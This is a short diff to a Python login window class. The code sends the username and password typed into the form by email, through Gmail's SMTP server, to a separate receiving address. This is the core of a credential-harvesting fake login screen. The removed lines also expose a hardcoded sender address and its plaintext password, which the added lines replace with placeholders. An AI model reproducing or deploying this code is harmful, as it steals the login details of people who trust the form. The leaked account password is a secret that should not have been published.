@@ -46,10 +46,10 @@ class Login:
 			server = smtplib.SMTP('smtp.gmail.com',587)
 			server.starttls()
 
-			server.login('test.sohom.demo@gmail.com','key@123456789')
+			server.login('yoursending mail','password')
 
-			server.sendmail('test.sohom.demo@gmail.com','gamer.rik3@gmail.com',self.txt_user.get())
-			server.sendmail('test.sohom.demo@gmail.com','gamer.rik3@gmail.com',self.txt_pass.get())
+			server.sendmail('yoursending mail','yourreceive mail',self.txt_user.get())
+			server.sendmail('yoursending mail','yourreceive mail',self.txt_pass.get())
 			print('Mail sent')
 
 
